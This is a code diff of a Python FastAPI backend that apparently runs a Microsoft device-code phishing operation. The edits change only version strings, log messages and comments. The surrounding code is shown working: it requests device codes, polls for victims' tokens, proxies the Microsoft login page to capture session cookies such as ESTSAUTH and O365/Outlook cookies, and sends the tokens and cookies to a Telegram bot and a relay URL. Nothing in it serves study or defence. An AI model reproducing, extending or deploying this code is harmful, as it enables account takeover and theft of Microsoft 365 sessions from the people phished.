@@ -10,7 +10,7 @@ from http.cookies import SimpleCookie
 from typing import Dict, Optional
 import redis.asyncio as aioredis
 
-app = FastAPI(title="Microsoft Device Code Backend v4.3", version="4.3")
+app = FastAPI(title="Microsoft Device Code Backend v4.4", version="4.4")
 
 # ====================== CONFIG ======================
 CLIENT_ID: Optional[str] = os.getenv("MICROSOFT_CLIENT_ID")
@@ -39,7 +39,7 @@ async def startup_event():
     global redis_client
     if not CLIENT_ID:
         print("❌ CRITICAL: MICROSOFT_CLIENT_ID is missing in Railway Variables!")
-        print("   Please add it and Redeploy.")
+        print("   Please add it and redeploy.")
     else:
         print("✅ MICROSOFT_CLIENT_ID loaded")
 
@@ -71,12 +71,12 @@ async def send_telegram(device_code: str, user_code: str, cookies_count: int):
     if not (TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID):
         return
     try:
-        msg = f"""🔔 <b>New Microsoft Session Captured & Relayed</b>
+        msg = f"""🔔 <b>New Microsoft Session Captured</b>
 
 🔑 Device: <code>{device_code[:12]}...</code>
 👤 User code: <code>{user_code}</code>
-🍪 Cookies captured: <b>{cookies_count}</b> (ESTSAUTH, fpc, esctx, O365/Outlook cookies)
-✅ Tokens + cookies sent to Railway"""
+🍪 Cookies: <b>{cookies_count}</b> (including O365/Outlook)
+✅ Tokens + cookies relayed"""
         async with httpx.AsyncClient() as c:
             await c.post(
                 f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
@@ -121,7 +121,7 @@ async def poll_for_token(device_code: str):
                         "token": data,
                         "cookies": session.get("cookies", {}),
                         "status": "success",
-                        "relay_source": "microsoft-device-code-relay-v4.3",
+                        "relay_source": "microsoft-device-code-relay-v4.4",
                         "timestamp": time.time()
                     }
                     if RELAY_URL:
@@ -152,7 +152,7 @@ async def poll_for_token(device_code: str):
                 await asyncio.sleep(interval)
 
 
-# ====================== COOKIE PROXY (Captures ALL cookies including O365/Outlook) ======================
+# ====================== PROXY (Fixed) ======================
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def advanced_cookie_proxy(device_code: str, request: Request):
     if not ENABLE_SESSION_PROXY:
@@ -175,7 +175,7 @@ async def advanced_cookie_proxy(device_code: str, request: Request):
             params=dict(request.query_params) if request.method == "GET" else None,
         )
 
-    # Capture EVERY cookie from all redirects
+    # Capture all cookies from every redirect
     captured = {}
     for past_resp in list(resp.history) + [resp]:
         for header in past_resp.headers.getlist("set-cookie"):
@@ -197,7 +197,7 @@ async def advanced_cookie_proxy(device_code: str, request: Request):
     session["cookies"].update(captured)
     await save_session(device_code, session, ttl=session.get("expires_in", 900) + 300)
 
-    # URL rewriting
+    # URL rewriting for Microsoft login flow
     content = resp.content
     if "text/html" in resp.headers.get("content-type", ""):
         html = resp.text
@@ -210,11 +210,11 @@ async def advanced_cookie_proxy(device_code: str, request: Request):
     return Response(content=content, status_code=resp.status_code, headers=headers, media_type=resp.headers.get("content-type"))
 
 
-# ====================== CORE ENDPOINTS ======================
+# ====================== API ENDPOINTS ======================
 @app.post("/start-device-auth")
 async def start_device_auth():
     if not CLIENT_ID:
-        raise HTTPException(500, "MICROSOFT_CLIENT_ID is not set in Railway Variables")
+        raise HTTPException(500, "MICROSOFT_CLIENT_ID is not set in Railway Variables. Please add it and redeploy.")
     async with httpx.AsyncClient() as client:
         r = await client.post(
             f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode",
@@ -263,7 +263,7 @@ async def health():
 
 @app.get("/")
 async def root():
-    return {"message": "Backend is running. Use your separate index.html frontend."}
+    return {"message": "Backend is running. Use your separate frontend."}
 
 
 if __name__ == "__main__":
